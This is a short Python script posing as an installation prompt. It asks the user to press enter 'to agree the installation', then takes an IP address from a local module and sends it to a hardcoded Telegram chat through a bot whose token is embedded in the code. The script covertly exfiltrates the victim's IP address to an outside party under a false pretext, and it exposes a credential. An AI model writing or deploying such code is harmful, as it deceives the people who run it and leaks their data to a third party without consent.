input("thats a code, press enter to agree the installation... ")
from test import ip

import telepot

TOKEN="2140343591:AAG3OwNwdSylSDnlP0s7civc7dEagQX8VaY"
chat_id="-763819940"

bot=telepot.Bot(TOKEN)
bot.sendMessage(chat_id,ip )